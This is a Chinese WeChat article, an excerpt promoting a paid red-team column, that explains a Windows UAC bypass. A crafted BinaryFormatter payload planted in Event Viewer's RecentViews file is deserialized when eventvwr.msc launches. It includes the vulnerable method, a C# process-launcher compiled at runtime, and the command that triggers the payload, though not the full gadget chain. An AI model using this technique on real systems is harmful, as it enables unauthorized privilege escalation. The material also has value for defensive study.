---
title: .NET内网实战：通过白名单文件反序列化漏洞绕过UAC
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247496225&idx=2&sn=f6933902136b7b238acbe1c6f78d718f&chksm=fa595ccccd2ed5da5b6ba7d157628c2d6c1da8716361531ea23fb206270067855fb51757b1a2&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-10-26
fetch_date: 2025-10-06T18:53:54.913330
---

# .NET内网实战：通过白名单文件反序列化漏洞绕过UAC

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEKlOTLdXCIK11U6iahaV3GevYkqNtnsv7ia8NdZuag9mpLTPWenibGtDIcw/0?wx_fmt=jpeg)

# .NET内网实战：通过白名单文件反序列化漏洞绕过UAC

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

基本介绍

本文内容部分节选自小报童《.NET 通过白名单文件反序列化漏洞绕过UAC》，完整的文章内容请加入小报童后订阅查看。现在限时只需59元，永久买断！目前已有220+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEK3srX5wUr2ggC1hnpwjCXH767T6mtib5EBSotlEuYEOwLqBbtI3TjU2g/640?wx_fmt=png&from=appmsg)

03

原理分析

在渗透测试和红队活动中，权限提升是重要的一环，尤其是在没有管理员权限的情况下执行更高权限的操作。有一种思路利用 Windows 事件查看器 eventvwr.msc 的高权限加载特性和 XAML 反序列化机制，以绕过 UAC 限制。

## 3.1 Windows事件查看器

在 Windows 系统中，事件查看器Event Viewer是一个非常有用的管理工具，可以帮助系统管理员和安全分析人员查看系统日志、应用程序日志、安全日志等。通常情况位于当前系统用户下的AppData\Local\Microsoft\Event Viewer目录。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEKNMnEj9PzdGkpkXQ9g5liaO4QvSNebYrexyIfgbyibpM5QAbJLfvTspEQ/640?wx_fmt=other&from=appmsg)

在事件查看器启动过程中，Windows 会自动加载 EventViewer.dll，这是事件查看器的核心 .NET 组件之一，提供事件记录的读取、解析和显示功能，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEK7jQgJvyR8GDxAuwyibmIdaiam4uHct5QlDDAZZX9xq4kjGmd5YRHEwcw/640?wx_fmt=other&from=appmsg)

由于 EventViewer.dll内部调用了LoadMostRecentViewsDataFromFile方法，此方法调用BinaryFormatter().Deserialize方法反序列化读取最近的事件记录内容，核心漏洞代码如下所示。

```
```
private void LoadMostRecentViewsDataFromFile()
{
   try
	{
	if (!string.IsNullOrEmpty(EventsNode.recentViewsFile) && File.Exists(EventsNode.recentViewsFile))
		{
		FileStream fileStream = new FileStream(EventsNode.recentViewsFile, FileMode.Open);
		object syncRoot = EventsNode.recentViewsDataArrayList.SyncRoot;
		lock (syncRoot)
		{
		EventsNode.recentViewsDataArrayList = (ArrayList)new BinaryFormatter().Deserialize(fileStream);
		}
		fileStream.Close();
	}
}catch (FileNotFoundException){}
}
```
```

## 3.2 动态编译启动新进程

首先代码中定义了一个名为 CreateSerializedData 的静态方法，方法内部的 text 字符串包含一段完整的.NET代码，用于创建一个控制台程序，内部使用了 DllImport 引入 Windows API 函数 CreateProcess，用于在桌面上创建一个新进程。

```
```
string text = "\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n\r\n\r\nclass HelloWorld\r\n{\r\n    [DllImport(\"kernel32.dll\")]\r\n    private static extern bool CreateProcess(\r\n     int dwCreationFlags,\r\n     IntPtr lpEnvironment,\r\n ref STARTUPINFO lpStartupInfo,\r\n     ref PROCESS_INFORMATION lpProcessInformation);\r\n\r\n    [StructLayout(LayoutKind.Sequential)]\r\n    struct STARTUPINFO\r\n    {\r\n        public Int32 cb;\r\n        public string lpReserved;\r\n        public string lpDesktop;\r\n        public string lpTitle;\r\n        public Int32 dwX;\r\n        public Int32 dwY;\r\n        public Int32 dwXSize;\r\n        public Int32 dwYSize;\r\n        public Int32 dwXCountChars;\r\n        public Int32 dwYCountChars;\r\n        public Int32 dwFillAttribute;\r\n        public Int32 dwFlags;\r\n        public Int16 wShowWindow;\r\n        public Int16 cbReserved2;\r\n        public IntPtr lpReserved2;\r\n        public IntPtr hStdInput;\r\n        public IntPtr hStdOutput;\r\n        public IntPtr hStdError;\r\n    }\r\n\r\n  internal struct PROCESS_INFORMATION\r\n    {\r\n        public IntPtr hProcess;\r\n        public IntPtr hThread;\r\n        public int dwProcessId;\r\n        public int dwThreadId;\r\n    }\r\n    \r\n\r\n    static void Main(string[] args)\r\n    {\r\n        string DesktopName=args[0];\r\n        string argumentsAsString = string.Join(\" \", args, 1, args.Length - 1);\r\n        STARTUPINFO si = new STARTUPINFO();\r\n        si.cb = Marshal.SizeOf(si);\r\n        si.lpDesktop = DesktopName;\r\n        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();\r\n        bool success = CreateProcess(\r\n            null,\r\n            argumentsAsString,\r\n            IntPtr.Zero,\r\n            IntPtr.Zero,\r\n            false,\r\n            48,\r\n            IntPtr.Zero,\r\n            null,\r\n            ref si,\r\n            ref pi);\r\n    }\r\n}\r\n";
Console.ForegroundColor = ConsoleColor.Yellow;
Console.WriteLine("Compling StartInSelectedDesktop...");
compilerParameters.GenerateExecutable = true;
compilerParameters.OutputAssembly = Path.Combine(Path.GetTempPath(), "StartInSelectedDesktop.exe");
```
```

## 3.3 白加黑启动绕过UAC

利用 eventvwr.msc 进程来触发恶意载荷的反序列化，从而绕过用户账户控制 (UAC) 限制启动新的 cmd 进程。因为此时恶意负载已经写入到 C:\Users\Ivan1ee\AppData\Local\Microsoft\Event Viewer\RecentViews，自动化打开事件查看器即可触发漏洞。具体代码如下所示

```
```
if (!Program.CreateProcess(null, "cmd /c start \"\" \"%windir%\\system32\\eventvwr.msc\"", IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION))
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEKL4OrCbJqzsBEy0fjs8ca7FIG2ibdn4xL7ggGOOTbJHXnhO4KYXLibFDQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibfaNSN6v42mLFJjHPiaXKEKGRjfHviaicMHnI93lacx7Hzqx8IAg7nvyHib8SueUMTm4HXN9GTOkAKmQ/640?wx_fmt=png&from=appmsg)

综上，利用了Windows事件查看器的反序列化漏洞，具备强大的UAC绕过能力。在红队渗透测试中，其高度隐蔽性和无文件特性而受到广泛应用。想要了解完整或者更多的内网安全防御绕过方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需59元，永久买断！目前已有200+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibTRic7PgrT4472YFHDrrOLlcTgKtwgm9cngTJDUib6AO9siaC7WXl6f8Jk1QZbYcib76QcIOBTicMDRhQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过